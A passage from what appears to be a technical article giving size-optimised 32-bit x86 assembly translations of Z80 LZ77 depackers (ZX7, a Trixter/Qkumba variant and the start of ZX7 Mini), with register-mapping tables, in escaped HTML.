#000000;\">mlz_literal</span>       <span style=\"color: #177500;\">; jr c, mlz_literal</span>\n    <span style=\"color: #000000;\">xor</span>    <span style=\"color: #A90D91;\">edx</span>, <span style=\"color: #A90D91;\">edx</span>\n    <span style=\"color: #000000;\">mov</span>    <span style=\"color: #A90D91;\">dh</span>, <span style=\"color: #000000;\">-</span><span style=\"color: #1C01CE;\">1</span>            <span style=\"color: #177500;\">; ld d, #FF</span>\n    <span style=\"color: #000000;\">xor</span>    <span style=\"color: #A90D91;\">ebx</span>, <span style=\"color: #A90D91;\">ebx</span>          <span style=\"color: #177500;\">; ld bc, 2</span>\n    <span style=\"color: #000000;\">push</span>   <span style=\"color: #1C01CE;\">2</span>\n    <span style=\"color: #000000;\">pop</span>    <span style=\"color: #A90D91;\">ecx</span>\n    <span style=\"color: #000000;\">call</span>   <span style=\"color: #A90D91;\">ebp</span>               <span style=\"color: #177500;\">; GET_BIT</span>\n    <span style=\"color: #000000;\">jc</span>     <span style=\"color: #000000;\">CASE01x</span>           <span style=\"color: #177500;\">; jr c, CASE01x</span>\n    <span style=\"color: #000000;\">call</span>   <span style=\"color: #A90D91;\">ebp</span>               <span style=\"color: #177500;\">; GET_BIT</span>\n    <span style=\"color: #000000;\">jc</span>     <span style=\"color: #000000;\">mlz_short_ofs</span>     <span style=\"color: #177500;\">; jr c, mlz_short_ofs</span>\n<span style=\"color: #000000;\">CASE000:</span>\n    <span style=\"color: #000000;\">dec</span>    <span style=\"color: #A90D91;\">ecx</span>               <span style=\"color: #177500;\">; dec c</span>\n    <span style=\"color: #000000;\">mov</span>    <span style=\"color: #A90D91;\">dl</span>, <span style=\"color: #1C01CE;\">63</span>            <span style=\"color: #177500;\">; ld e, %00111111</span>\n<span style=\"color: #000000;\">ReadThreeBits:</span>\n    <span style=\"color: #000000;\">call</span>   <span style=\"color: #A90D91;\">ebp</span>               <span style=\"color: #177500;\">; GET_BIT</span>\n    <span style=\"color: #000000;\">adc</span>    <span style=\"color: #A90D91;\">dl</span>, <span style=\"color: #A90D91;\">dl</span>            <span style=\"color: #177500;\">; rl e</span>\n    <span style=\"color: #000000;\">jnc</span>    <span style=\"color: #000000;\">ReadThreeBits</span>     <span style=\"color: #177500;\">; jr nc, ReadThreeBits</span>\n<span style=\"color: #000000;\">mlz_copy_bytes:</span>\n    <span style=\"color: #000000;\">push</span>   <span style=\"color: #A90D91;\">esi</span>               <span style=\"color: #177500;\">; push hl</span>\n    <span style=\"color: #000000;\">movsx</span>  <span style=\"color: #A90D91;\">edx</span>, <span style=\"color: #A90D91;\">dx</span>           <span style=\"color: #177500;\">; sign-extend dx to 32-bits</span>\n    <span style=\"color: #000000;\">lea</span>    <span style=\"color: #A90D91;\">esi</span>, [<span style=\"color: #A90D91;\">edi</span><span style=\"color: #000000;\">+</span><span style=\"color: #A90D91;\">edx</span>]    <span style=\"color: #177500;\">; </span>\n    <span style=\"color: #000000;\">rep</span>    <span style=\"color: #000000;\">movsb</span>             <span style=\"color: #177500;\">; ldir</span>\n    <span style=\"color: #000000;\">pop</span>    <span style=\"color: #A90D91;\">esi</span>               <span style=\"color: #177500;\">; pop hl</span>\n    <span style=\"color: #000000;\">jmp</span>    <span style=\"color: #000000;\">mlz_main</span>          <span style=\"color: #177500;\">; jr mlz_main</span>\n<span style=\"color: #000000;\">CASE01x:</span>\n    <span style=\"color: #000000;\">call</span>   <span style=\"color: #A90D91;\">ebp</span>               <span style=\"color: #177500;\">; GET_BIT</span>\n    <span style=\"color: #000000;\">jnc</span>    <span style=\"color: #000000;\">CASE010</span>           <span style=\"color: #177500;\">; jr nc, CASE010</span>\n    <span style=\"color: #000000;\">dec</span>    <span style=\"color: #A90D91;\">ecx</span>               <span style=\"color: #177500;\">; dec c</span>\n<span style=\"color: #000000;\">ReadLogLength:</span>\n    <span style=\"color: #000000;\">call</span>   <span style=\"color: #A90D91;\">ebp</span>               <span style=\"color: #177500;\">; GET_BIT</span>\n    <span style=\"color: #000000;\">inc</span>    <span style=\"color: #A90D91;\">ebx</span>               <span style=\"color: #177500;\">; inc b</span>\n    <span style=\"color: #000000;\">jnc</span>    <span style=\"color: #000000;\">ReadLogLength</span>     <span style=\"color: #177500;\">; jr nc, ReadLogLength</span>\n<span style=\"color: #000000;\">mlz_read_len:</span>\n    <span style=\"color: #000000;\">call</span>   <span style=\"color: #A90D91;\">ebp</span>               <span style=\"color: #177500;\">; GET_BIT</span>\n    <span style=\"color: #000000;\">adc</span>    <span style=\"color: #A90D91;\">cl</span>, <span style=\"color: #A90D91;\">cl</span>            <span style=\"color: #177500;\">; rl c</span>\n    <span style=\"color: #000000;\">jc</span>     <span style=\"color: #000000;\">mlz_exit</span>          <span style=\"color: #177500;\">; jr c, mlz_exit</span>\n    <span style=\"color: #000000;\">dec</span>    <span style=\"color: #A90D91;\">ebx</span>               <span style=\"color: #177500;\">; djnz mlz_read_len</span>\n    <span style=\"color: #000000;\">jnz</span>    <span style=\"color: #000000;\">mlz_read_len</span>\n    <span style=\"color: #000000;\">inc</span>    <span style=\"color: #A90D91;\">ecx</span>               <span style=\"color: #177500;\">; inc c</span>\n<span style=\"color: #000000;\">CASE010:</span>\n    <span style=\"color: #000000;\">inc</span>    <span style=\"color: #A90D91;\">ecx</span>               <span style=\"color: #177500;\">; inc c</span>\n    <span style=\"color: #000000;\">call</span>   <span style=\"color: #A90D91;\">ebp</span>               <span style=\"color: #177500;\">; GET_BIT</span>\n    <span style=\"color: #000000;\">jnc</span>    <span style=\"color: #000000;\">mlz_short_ofs</span>     <span style=\"color: #177500;\">; jr nc, mlz_short_ofs</span>\n    <span style=\"color: #000000;\">mov</span>    <span style=\"color: #A90D91;\">dh</span>, <span style=\"color: #1C01CE;\">31</span>            <span style=\"color: #177500;\">; ld d, %00011111</span>\n<span style=\"color: #000000;\">mlz_long_ofs:</span>\n    <span style=\"color: #000000;\">call</span>   <span style=\"color: #A90D91;\">ebp</span>               <span style=\"color: #177500;\">; GET_BIT</span>\n    <span style=\"color: #000000;\">adc</span>    <span style=\"color: #A90D91;\">dh</span>, <span style=\"color: #A90D91;\">dh</span>            <span style=\"color: #177500;\">; rl d</span>\n    <span style=\"color: #000000;\">jnc</span>    <span style=\"color: #000000;\">mlz_long_ofs</span>      <span style=\"color: #177500;\">; jr nc, mlz_long_ofs</span>\n    <span style=\"color: #000000;\">dec</span>    <span style=\"color: #A90D91;\">edx</span>               <span style=\"color: #177500;\">; dec d</span>\n<span style=\"color: #000000;\">mlz_short_ofs:</span>\n    <span style=\"color: #000000;\">mov</span>    <span style=\"color: #A90D91;\">dl</span>, [<span style=\"color: #A90D91;\">esi</span>]         <span style=\"color: #177500;\">; ld e, (hl)</span>\n    <span style=\"color: #000000;\">inc</span>    <span style=\"color: #A90D91;\">esi</span>               <span style=\"color: #177500;\">; inc hl</span>\n    <span style=\"color: #000000;\">jmp</span>    <span style=\"color: #000000;\">mlz_copy_bytes</span>    <span style=\"color: #177500;\">; jr mlz_copy_bytes</span>\n<span style=\"color: #000000;\">mlz_exit:</span>\n    <span style=\"color: #000000;\">sub</span>    <span style=\"color: #A90D91;\">edi</span>, [<span style=\"color: #A90D91;\">esp</span><span style=\"color: #000000;\">+</span><span style=\"color: #1C01CE;\">32</span><span style=\"color: #000000;\">+</span><span style=\"color: #1C01CE;\">4</span>]\n    <span style=\"color: #000000;\">mov</span>    [<span style=\"color: #A90D91;\">esp</span><span style=\"color: #000000;\">+</span><span style=\"color: #1C01CE;\">28</span>], <span style=\"color: #A90D91;\">edi</span>     <span style=\"color: #177500;\">; eax = decompressed length</span>\n    <span style=\"color: #000000;\">popad</span>\n    <span style=\"color: #000000;\">ret</span>\n</pre>\n</div>\n<h2 id=\"zx7\">10.2 ZX7</h2>\n<p>Designed by <a href=\"http://www.worldofspectrum.org/infoseekid.cgi?id=0027996\">Einar Saukas</a> and published in 2012. ZX7 is an optimal LZ77 algorithm for the ZX-Spectrum using a combination of fixed length and variable length Gamma codes for the match length and offset. The following is a translation of the standard Z80 depacker to a 32-bit x86 assembly in 111 bytes.</p>\n<table id=\"t03\">\n<tr>\n<th colspan=\"2\">Register Mapping</th>\n</tr>\n<tr>\n<td>Z80</td>\n<td>x86</td>\n</tr>\n<tr>\n<td>A</td>\n<td>AL</td>\n</tr>\n<tr>\n<td>B</td>\n<td>CH</td>\n</tr>\n<tr>\n<td>C</td>\n<td>CL</td>\n</tr>\n<tr>\n<td>BC</td>\n<td>CX</td>\n</tr>\n<tr>\n<td>D</td>\n<td>DH</td>\n</tr>\n<tr>\n<td>E</td>\n<td>DL</td>\n</tr>\n<tr>\n<td>HL</td>\n<td>ESI</td>\n</tr>\n<tr>\n<td>DE</td>\n<td>EDX or EDI</td>\n</tr>\n</table>\n<div class=\"highlight\" style=\"background: #ffffff;\">\n<pre style=\"line-height: 125%;\"><span></span><span style=\"color: #000000;\">dzx7_standard:</span>\n<span style=\"color: #000000;\">_dzx7_standard:</span>\n    <span style=\"color: #000000;\">pushad</span>\n    \n    <span style=\"color: #177500;\">; tested on Windows</span>\n    <span style=\"color: #000000;\">mov</span>    <span style=\"color: #A90D91;\">esi</span>, [<span style=\"color: #A90D91;\">esp</span><span style=\"color: #000000;\">+</span><span style=\"color: #1C01CE;\">32</span><span style=\"color: #000000;\">+</span><span style=\"color: #1C01CE;\">12</span>]     <span style=\"color: #177500;\">; hl = source</span>\n    <span style=\"color: #000000;\">mov</span>    <span style=\"color: #A90D91;\">edi</span>, [<span style=\"color: #A90D91;\">esp</span><span style=\"color: #000000;\">+</span><span style=\"color: #1C01CE;\">32</span><span style=\"color: #000000;\">+</span> <span style=\"color: #1C01CE;\">4</span>]     <span style=\"color: #177500;\">; de = destination</span>\n    \n    <span style=\"color: #000000;\">mov</span>    <span style=\"color: #A90D91;\">al</span>, <span style=\"color: #1C01CE;\">0x80</span>             <span style=\"color: #177500;\">; ld      a, $80</span>\n<span style=\"color: #000000;\">dzx7s_copy_byte_loop:</span>\n    <span style=\"color: #177500;\">; copy literal byte</span>\n    <span style=\"color: #000000;\">movsb</span>                       <span style=\"color: #177500;\">; ldi                             </span>\n<span style=\"color: #000000;\">dzx7s_main_loop:</span>\n    <span style=\"color: #000000;\">call</span>   <span style=\"color: #000000;\">dzx7s_next_bit</span>       <span style=\"color: #177500;\">; call    dzx7s_next_bit</span>\n<span style=\"color: #177500;\">; next bit indicates either literal or sequence</span>\n    <span style=\"color: #000000;\">jnc</span>    <span style=\"color: #000000;\">dzx7s_copy_byte_loop</span> <span style=\"color: #177500;\">; jr      nc, dzx7s_copy_byte_loop</span>\n\n<span style=\"color: #177500;\">; determine number of bits used for length (Elias gamma coding)</span>\n    <span style=\"color: #000000;\">push</span>   <span style=\"color: #A90D91;\">edi</span>                  <span style=\"color: #177500;\">; push    de</span>\n    <span style=\"color: #000000;\">mov</span>    <span style=\"color: #A90D91;\">ecx</span>, <span style=\"color: #1C01CE;\">0</span>               <span style=\"color: #177500;\">; ld      bc, 0</span>\n    <span style=\"color: #000000;\">mov</span>    <span style=\"color: #A90D91;\">dh</span>, <span style=\"color: #A90D91;\">ch</span>               <span style=\"color: #177500;\">; ld      d, b</span>\n<span style=\"color: #000000;\">dzx7s_len_size_loop:</span>\n    <span style=\"color: #000000;\">inc</span>    <span style=\"color: #A90D91;\">dh</span>                   <span style=\"color: #177500;\">; inc     d</span>\n    <span style=\"color: #000000;\">call</span>   <span style=\"color: #000000;\">dzx7s_next_bit</span>       <span style=\"color: #177500;\">; call    dzx7s_next_bit</span>\n    <span style=\"color: #000000;\">jnc</span>    <span style=\"color: #000000;\">dzx7s_len_size_loop</span>  <span style=\"color: #177500;\">; jr      nc, dzx7s_len_size_loop</span>\n<span style=\"color: #177500;\">; determine length</span>\n<span style=\"color: #000000;\">dzx7s_len_value_loop:</span>\n    <span style=\"color: #000000;\">jc</span>     <span style=\"color: #000000;\">skip_call</span>\n    <span style=\"color: #000000;\">call</span>   <span style=\"color: #000000;\">dzx7s_next_bit</span>       <span style=\"color: #177500;\">; call    nc, dzx7s_next_bit</span>\n<span style=\"color: #000000;\">skip_call:</span>\n    <span style=\"color: #000000;\">rcl</span>    <span style=\"color: #A90D91;\">cl</span>, <span style=\"color: #1C01CE;\">1</span>                <span style=\"color: #177500;\">; rl      c</span>\n    <span style=\"color: #000000;\">rcl</span>    <span style=\"color: #A90D91;\">ch</span>, <span style=\"color: #1C01CE;\">1</span>                <span style=\"color: #177500;\">; rl      b</span>\n    <span style=\"color: #177500;\">; check end marker</span>\n    <span style=\"color: #000000;\">jc</span>     <span style=\"color: #000000;\">dzx7s_exit</span>           <span style=\"color: #177500;\">; jr      c, dzx7s_exit           </span>\n    <span style=\"color: #000000;\">dec</span>    <span style=\"color: #A90D91;\">dh</span>                   <span style=\"color: #177500;\">; dec     d</span>\n    <span style=\"color: #000000;\">jnz</span>    <span style=\"color: #000000;\">dzx7s_len_value_loop</span> <span style=\"color: #177500;\">; jr      nz, dzx7s_len_value_loop</span>\n    <span style=\"color: #177500;\">; adjust length</span>\n    <span style=\"color: #000000;\">inc</span>    <span style=\"color: #A90D91;\">cx</span>                   <span style=\"color: #177500;\">; inc     bc                      </span>\n\n<span style=\"color: #177500;\">; determine offset</span>\n    <span style=\"color: #177500;\">; load offset flag (1 bit) + offset value (7 bits)</span>\n    <span style=\"color: #000000;\">mov</span>    <span style=\"color: #A90D91;\">dl</span>, [<span style=\"color: #A90D91;\">esi</span>]            <span style=\"color: #177500;\">; ld      e, (hl)                 </span>\n    <span style=\"color: #000000;\">inc</span>    <span style=\"color: #A90D91;\">esi</span>                  <span style=\"color: #177500;\">; inc     hl</span>\n    <span style=\"color: #177500;\">; opcode for undocumented instruction \"SLL E\" aka \"SLS E\"</span>\n    <span style=\"color: #000000;\">shl</span>    <span style=\"color: #A90D91;\">dl</span>, <span style=\"color: #1C01CE;\">1</span>                <span style=\"color: #177500;\">; defb    $cb, $33                </span>\n    <span style=\"color: #177500;\">; if offset flag is set, load 4 extra bits</span>\n    <span style=\"color: #000000;\">jnc</span>    <span style=\"color: #000000;\">dzx7s_offset_end</span>     <span style=\"color: #177500;\">; jr      nc, dzx7s_offset_end    </span>\n    <span style=\"color: #177500;\">; bit marker to load 4 bits</span>\n    <span style=\"color: #000000;\">mov</span>    <span style=\"color: #A90D91;\">dh</span>, <span style=\"color: #1C01CE;\">0x10</span>             <span style=\"color: #177500;\">; ld      d, $10                  </span>\n<span style=\"color: #000000;\">dzx7s_rld_next_bit:</span>\n    <span style=\"color: #000000;\">call</span>   <span style=\"color: #000000;\">dzx7s_next_bit</span>       <span style=\"color: #177500;\">; call    dzx7s_next_bit</span>\n    <span style=\"color: #177500;\">; insert next bit into D</span>\n    <span style=\"color: #000000;\">rcl</span>    <span style=\"color: #A90D91;\">dh</span>, <span style=\"color: #1C01CE;\">1</span>                <span style=\"color: #177500;\">; rl      d                       </span>\n    <span style=\"color: #177500;\">; repeat 4 times, until bit marker is out</span>\n    <span style=\"color: #000000;\">jnc</span>    <span style=\"color: #000000;\">dzx7s_rld_next_bit</span>   <span style=\"color: #177500;\">; jr      nc, dzx7s_rld_next_bit  </span>\n    <span style=\"color: #177500;\">; add 128 to DE</span>\n    <span style=\"color: #000000;\">inc</span>    <span style=\"color: #A90D91;\">dh</span>                   <span style=\"color: #177500;\">; inc     d </span>\n    <span style=\"color: #177500;\">; retrieve fourth bit from D                      </span>\n    <span style=\"color: #000000;\">shr</span>    <span style=\"color: #A90D91;\">dh</span>, <span style=\"color: #1C01CE;\">1</span>                <span style=\"color: #177500;\">; srl\td\t\t\t</span>\n<span style=\"color: #000000;\">dzx7s_offset_end:</span>\n    <span style=\"color: #177500;\">; insert fourth bit into E</span>\n    <span style=\"color: #000000;\">rcr</span>    <span style=\"color: #A90D91;\">dl</span>, <span style=\"color: #1C01CE;\">1</span>                <span style=\"color: #177500;\">; rr      e                       </span>\n\n<span style=\"color: #177500;\">; copy previous sequence</span>\n    <span style=\"color: #177500;\">; store source, restore destination</span>\n    <span style=\"color: #000000;\">xchg</span>   <span style=\"color: #A90D91;\">esi</span>, [<span style=\"color: #A90D91;\">esp</span>]           <span style=\"color: #177500;\">; ex      (sp), hl </span>\n    <span style=\"color: #177500;\">; store destination</span>\n    <span style=\"color: #000000;\">push</span>   <span style=\"color: #A90D91;\">esi</span>                  <span style=\"color: #177500;\">; push    hl                      </span>\n    <span style=\"color: #177500;\">; HL = destination - offset - 1</span>\n    <span style=\"color: #000000;\">sbb</span>    <span style=\"color: #A90D91;\">esi</span>, <span style=\"color: #A90D91;\">edx</span>             <span style=\"color: #177500;\">; sbc     hl, de                  </span>\n    <span style=\"color: #177500;\">; DE = destination</span>\n    <span style=\"color: #000000;\">pop</span>    <span style=\"color: #A90D91;\">edi</span>                  <span style=\"color: #177500;\">; pop     de                      </span>\n    <span style=\"color: #000000;\">rep</span>    <span style=\"color: #000000;\">movsb</span>                <span style=\"color: #177500;\">; ldir</span>\n<span style=\"color: #000000;\">dzx7s_exit:</span>\n    <span style=\"color: #000000;\">pop</span>    <span style=\"color: #A90D91;\">esi</span>                  <span style=\"color: #177500;\">; pop     hl             </span>\n    <span style=\"color: #000000;\">jnc</span>    <span style=\"color: #000000;\">dzx7s_main_loop</span>      <span style=\"color: #177500;\">; jr      nc, dzx7s_main_loop</span>\n    <span style=\"color: #000000;\">sub</span>    <span style=\"color: #A90D91;\">edi</span>, [<span style=\"color: #A90D91;\">esp</span><span style=\"color: #000000;\">+</span><span style=\"color: #1C01CE;\">32</span><span style=\"color: #000000;\">+</span><span style=\"color: #1C01CE;\">4</span>]\n    <span style=\"color: #000000;\">mov</span>    [<span style=\"color: #A90D91;\">esp</span><span style=\"color: #000000;\">+</span><span style=\"color: #1C01CE;\">28</span>], <span style=\"color: #A90D91;\">edi</span>\n    <span style=\"color: #000000;\">popad</span>\n    <span style=\"color: #000000;\">ret</span>\n<span style=\"color: #000000;\">dzx7s_next_bit:</span>\n    <span style=\"color: #177500;\">; check next bit</span>\n    <span style=\"color: #000000;\">add</span>    <span style=\"color: #A90D91;\">al</span>, <span style=\"color: #A90D91;\">al</span>               <span style=\"color: #177500;\">; add     a, a    </span>\n    <span style=\"color: #177500;\">; no more bits left?</span>\n    <span style=\"color: #000000;\">jnz</span>    <span style=\"color: #000000;\">exit_get_bit</span>         <span style=\"color: #177500;\">; ret     nz      </span>\n    <span style=\"color: #177500;\">; load another group of 8 bits</span>\n    <span style=\"color: #000000;\">mov</span>    <span style=\"color: #A90D91;\">al</span>, [<span style=\"color: #A90D91;\">esi</span>]            <span style=\"color: #177500;\">; ld      a, (hl) </span>\n    <span style=\"color: #000000;\">inc</span>    <span style=\"color: #A90D91;\">esi</span>                  <span style=\"color: #177500;\">; inc     hl</span>\n    <span style=\"color: #000000;\">rcl</span>    <span style=\"color: #A90D91;\">al</span>, <span style=\"color: #1C01CE;\">1</span>                <span style=\"color: #177500;\">; rla</span>\n<span style=\"color: #000000;\">exit_get_bit:</span>\n    <span style=\"color: #000000;\">ret</span>                         <span style=\"color: #177500;\">; ret</span>\n</pre>\n</div>\n<p>The following is a 32-Bit version of a size-optimized <a href=\"https://www.dropbox.com/sh/mwa5geyxgl9m24k/AACtCCyO5W1_3-1bI8YxPHLca\">16-bit code</a> implemented by <a href=\"https://twitter.com/MobyGamer\">Trixter</a> and <a href=\"http://pferrie.epizy.com/?i=1\">Qkumba</a> in 2016. It&#8217;s currently 81 bytes.</p>\n<div class=\"highlight\" style=\"background: #ffffff;\">\n<pre style=\"line-height: 125%;\"><span></span><span style=\"color: #000000;\">zx7_depack:</span>\n<span style=\"color: #000000;\">_zx7_depack:</span>\n    <span style=\"color: #000000;\">pushad</span>\n    <span style=\"color: #000000;\">mov</span>    <span style=\"color: #A90D91;\">edi</span>, [<span style=\"color: #A90D91;\">esp</span><span style=\"color: #000000;\">+</span><span style=\"color: #1C01CE;\">32</span><span style=\"color: #000000;\">+</span> <span style=\"color: #1C01CE;\">4</span>] <span style=\"color: #177500;\">; output</span>\n    <span style=\"color: #000000;\">mov</span>    <span style=\"color: #A90D91;\">esi</span>, [<span style=\"color: #A90D91;\">esp</span><span style=\"color: #000000;\">+</span><span style=\"color: #1C01CE;\">32</span><span style=\"color: #000000;\">+</span><span style=\"color: #1C01CE;\">12</span>] <span style=\"color: #177500;\">; input</span>\n    \n    <span style=\"color: #000000;\">call</span>   <span style=\"color: #000000;\">init_get_bit</span>\n    <span style=\"color: #000000;\">add</span>    <span style=\"color: #A90D91;\">al</span>, <span style=\"color: #A90D91;\">al</span>           <span style=\"color: #177500;\">; check next bit</span>\n    <span style=\"color: #000000;\">jnz</span>    <span style=\"color: #000000;\">exit_get_bit</span>     <span style=\"color: #177500;\">; no more bits left?</span>\n    <span style=\"color: #000000;\">lodsb</span>                   <span style=\"color: #177500;\">; load another group of 8 bits</span>\n    <span style=\"color: #000000;\">adc</span>    <span style=\"color: #A90D91;\">al</span>, <span style=\"color: #A90D91;\">al</span>\n<span style=\"color: #000000;\">exit_get_bit:</span>\n    <span style=\"color: #000000;\">ret</span>\n<span style=\"color: #000000;\">init_get_bit:</span>\n    <span style=\"color: #000000;\">pop</span>    <span style=\"color: #A90D91;\">ebp</span>\n    <span style=\"color: #000000;\">mov</span>    <span style=\"color: #A90D91;\">al</span>, <span style=\"color: #1C01CE;\">80h</span>\n    <span style=\"color: #000000;\">xor</span>    <span style=\"color: #A90D91;\">ecx</span>, <span style=\"color: #A90D91;\">ecx</span>\n<span style=\"color: #000000;\">copy_byte:</span>\n    <span style=\"color: #000000;\">movsb</span>                    <span style=\"color: #177500;\">; copy literal byte</span>\n<span style=\"color: #000000;\">main_loop:</span>\n    <span style=\"color: #000000;\">call</span>   <span style=\"color: #A90D91;\">ebp</span>\n    <span style=\"color: #000000;\">jnc</span>    <span style=\"color: #000000;\">copy_byte</span>         <span style=\"color: #177500;\">; next bit indicates either</span>\n                             <span style=\"color: #177500;\">; literal or sequence</span>\n<span style=\"color: #177500;\">; determine number of bits used for length (Elias gamma coding)</span>\n    <span style=\"color: #000000;\">xor</span>    <span style=\"color: #A90D91;\">ebx</span>, <span style=\"color: #A90D91;\">ebx</span>\n<span style=\"color: #000000;\">len_size_loop:</span>\n    <span style=\"color: #000000;\">inc</span>    <span style=\"color: #A90D91;\">ebx</span>\n    <span style=\"color: #000000;\">call</span>   <span style=\"color: #A90D91;\">ebp</span>\n    <span style=\"color: #000000;\">jnc</span>    <span style=\"color: #000000;\">len_size_loop</span>\n    <span style=\"color: #000000;\">jmp</span>    <span style=\"color: #000000;\">len_value_skip</span>\n<span style=\"color: #177500;\">; determine length</span>\n<span style=\"color: #000000;\">len_value_loop:</span>\n    <span style=\"color: #000000;\">call</span>   <span style=\"color: #A90D91;\">ebp</span>\n<span style=\"color: #000000;\">len_value_skip:</span>\n    <span style=\"color: #000000;\">adc</span>    <span style=\"color: #A90D91;\">cx</span>, <span style=\"color: #A90D91;\">cx</span>\n    <span style=\"color: #000000;\">jc</span>     <span style=\"color: #000000;\">zx7_exit</span>       <span style=\"color: #177500;\">; check end marker</span>\n    \n    <span style=\"color: #000000;\">dec</span>    <span style=\"color: #A90D91;\">ebx</span>\n    <span style=\"color: #000000;\">jnz</span>    <span style=\"color: #000000;\">len_value_loop</span>\n    \n    <span style=\"color: #000000;\">inc</span>    <span style=\"color: #A90D91;\">ecx</span>            <span style=\"color: #177500;\">; adjust length</span>\n                          <span style=\"color: #177500;\">; determine offset</span>\n    <span style=\"color: #000000;\">mov</span>    <span style=\"color: #A90D91;\">bl</span>, [<span style=\"color: #A90D91;\">esi</span>]      <span style=\"color: #177500;\">; load offset flag (1 bit) +</span>\n                          <span style=\"color: #177500;\">; offset value (7 bits)</span>\n    <span style=\"color: #000000;\">inc</span>    <span style=\"color: #A90D91;\">esi</span>\n    <span style=\"color: #000000;\">stc</span>\n    <span style=\"color: #000000;\">adc</span>    <span style=\"color: #A90D91;\">bl</span>, <span style=\"color: #A90D91;\">bl</span>\n    <span style=\"color: #000000;\">jnc</span>    <span style=\"color: #000000;\">offset_end</span>     <span style=\"color: #177500;\">; if offset flag is set, load</span>\n                          <span style=\"color: #177500;\">; 4 extra bits</span>\n    <span style=\"color: #000000;\">mov</span>    <span style=\"color: #A90D91;\">bh</span>, <span style=\"color: #1C01CE;\">10h</span>        <span style=\"color: #177500;\">; bit marker to load 4 bits</span>\n<span style=\"color: #000000;\">rld_next_bit:</span>\n    <span style=\"color: #000000;\">call</span>   <span style=\"color: #A90D91;\">ebp</span>\n    <span style=\"color: #000000;\">adc</span>    <span style=\"color: #A90D91;\">bh</span>, <span style=\"color: #A90D91;\">bh</span>         <span style=\"color: #177500;\">; insert next bit into D</span>\n    <span style=\"color: #000000;\">jnc</span>    <span style=\"color: #000000;\">rld_next_bit</span>   <span style=\"color: #177500;\">; repeat 4 times, until bit</span>\n                          <span style=\"color: #177500;\">; marker is out</span>\n    <span style=\"color: #000000;\">inc</span>    <span style=\"color: #A90D91;\">bh</span>             <span style=\"color: #177500;\">; add 256 to DE</span>\n<span style=\"color: #000000;\">offset_end:</span>\n    <span style=\"color: #000000;\">shr</span>    <span style=\"color: #A90D91;\">ebx</span>, <span style=\"color: #1C01CE;\">1</span>         <span style=\"color: #177500;\">; insert fourth bit into E</span>\n    <span style=\"color: #000000;\">push</span>   <span style=\"color: #A90D91;\">esi</span>\n    <span style=\"color: #000000;\">mov</span>    <span style=\"color: #A90D91;\">esi</span>, <span style=\"color: #A90D91;\">edi</span>\n    <span style=\"color: #000000;\">sbb</span>    <span style=\"color: #A90D91;\">esi</span>, <span style=\"color: #A90D91;\">ebx</span>       <span style=\"color: #177500;\">; destination = destination - offset - 1</span>\n    <span style=\"color: #000000;\">rep</span>    <span style=\"color: #000000;\">movsb</span>\n    <span style=\"color: #000000;\">pop</span>    <span style=\"color: #A90D91;\">esi</span>            <span style=\"color: #177500;\">; restore source address</span>\n    <span style=\"color: #000000;\">jmp</span>    <span style=\"color: #000000;\">main_loop</span>\n<span style=\"color: #000000;\">zx7_exit:</span>\n    <span style=\"color: #000000;\">sub</span>    <span style=\"color: #A90D91;\">edi</span>, [<span style=\"color: #A90D91;\">esp</span><span style=\"color: #000000;\">+</span><span style=\"color: #1C01CE;\">32</span><span style=\"color: #000000;\">+</span><span style=\"color: #1C01CE;\">4</span>]\n    <span style=\"color: #000000;\">mov</span>    [<span style=\"color: #A90D91;\">esp</span><span style=\"color: #000000;\">+</span><span style=\"color: #1C01CE;\">28</span>], <span style=\"color: #A90D91;\">edi</span>\n    <span style=\"color: #000000;\">popad</span>\n    <span style=\"color: #000000;\">ret</span>\n</pre>\n</div>\n<h2 id=\"zx7_mini\">10.3 ZX7 Mini</h2>\n<p>Designed by <a href=\"https://twitter.com/antoniovil\">Antonio Villena</a> and <a href=\"https://github.com/antoniovillena/zx7mini\">published in 2019</a>. This version uses less code at the expense of the compression ratio. Nevertheless, it&#8217;s a great example to demonstrate the conversion between Z80 and x86.</p>\n<table id=\"t03\">\n<tr>\n<th colspan=\"2\">Register Mapping</th>\n</tr>\n<tr>\n<td>Z80</td>\n<td>x86</td>\n</tr>\n<tr>\n<td>A</td>\n<td>AL</td>\n</tr>\n<tr>\n<td>BC</td>\n<td>ECX</td>\n</tr>\n<tr>\n<td>D</td>\n<td>DH</td>\n</tr>\n<tr>\n<td>E</td>\n<td>DL</td>\n</tr>\n<tr>\n<td>HL</td>\n<td>ESI</td>\n</tr>\n<tr>\n<td>DE</td>\n<td>EDI</td>\n</tr>\n</table>\n<div class=\"highlight\" style=\"background: #ffffff;\">\n<pre style=\"line-height: 125%;\"><span></span><span style=\"color: #000000;\">zx7_depack:</span>\n<span style=\"color: #000000;\">_zx7_depack:</span>\n    <span style=\"color: #000000;\">pushad</span>\n\n    <span style=\"color: #000000;\">mov</span>    <span style=\"color: #A90D91;\">esi</span>, [<span style=\"color: #A90D91;\">esp</span><span style=\"color: #000000;\">+</span><span style=\"color: #1C01CE;\">32</span><span style=\"color: #000000;\">+</span><span style=\"color: #1C01CE;\">4</span>] <span style=\"color: #177500;\">; esi = in</span>\n    <span style=\"color: #000000;\">mov</span>    <span style=\"color: #A90D91;\">edi</span>, [<span style=\"color: #A90D91;\">esp</span><span style=\"color: #000000;\">+</span><span style=\"color: #1C01CE;\">32</span><span style=\"color: #000000;\">+</span><span style=\"color: #1C01CE;\">8</span>] <span style=\"color: #177500;\">; edi = out</span>\n\n    <span style=\"color: #000000;\">call</span>   <span style=\"color: #000000;\">init_getbit</span>\n<span style=\"color: #000000;\">getbit:</span>  \n    <span style=\"color: #000000;\">add</span>    <span style=\"color: #A90D91;\">al</span>, <span style=\"color: #A90D91;\">al</span>          <span style=\"color: #177500;\">; add     a, a</span>\n    <span style=\"color: #000000;\">jnz</span>    <span style=\"color: #000000;\">exit_getbit</span>     <span style=\"color: #177500;\">; ret     nz</span>\n    <span style=\"color: #000000;\">lodsb</span>                  <span style=\"color: #177500;\">; ld      a, (hl)</span>\n                           <span style=\"color: #177500;\">; inc     hl</span>\n    <span style=\"color: #000000;\">adc</span>    <span style=\"color: #A90D91;\">al</span>, <span style=\"color: #A90D91;\">al</span>          <span style=\"color: #177500;\">; adc     a, a</span>\n<span style=\"color: #000000;\">exit_getbit:</span>\n    <span style=\"color: #000000;\">ret</span>\n<span style=\"color: #000000;\">init_getbit:</span>\n    <span style=\"color: #000000;\">pop</span>    <span style=\"color: #A90D91;\">ebp</span>             <span style=\"color: #177500;\">;</span>\n    <span style=\"color: #000000;\">mov</span>    <span style=\"color: #A90D91;\">al</span>, <span style=\"color: #1C01CE;\">80h</span>         <span style=\"color: #177500;\">; ld      a, $80</span>\n<span style=\"color: 